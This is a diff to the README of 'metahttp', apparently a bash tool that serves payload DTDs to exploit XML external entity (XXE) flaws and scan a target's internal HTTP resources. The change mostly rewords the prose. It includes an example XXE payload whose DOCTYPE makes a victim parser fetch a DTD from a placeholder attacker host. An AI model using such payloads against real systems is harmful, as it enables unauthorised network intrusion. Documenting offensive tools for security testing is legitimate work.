@@ -9,8 +9,10 @@ A bash script that automates the scanning of a target network for HTTP resources
 ## How it works
 
 Initially, metahttp hosts an HTTP server that is responsible to deliver the payload DTDs to the target application.
+
 Then the attacker triggers the XXE to have the target server load the DTDs from the server hosted by metahttp.
-For example, the external DTDs could be loaded with the following XML document to the victim parser:
+
+For example, by having the victim application parse the following XML document:
 ```xml
 <!DOCTYPE r SYSTEM "http://attacker_host:8080/serveme.dtd"><r></r>
 ```
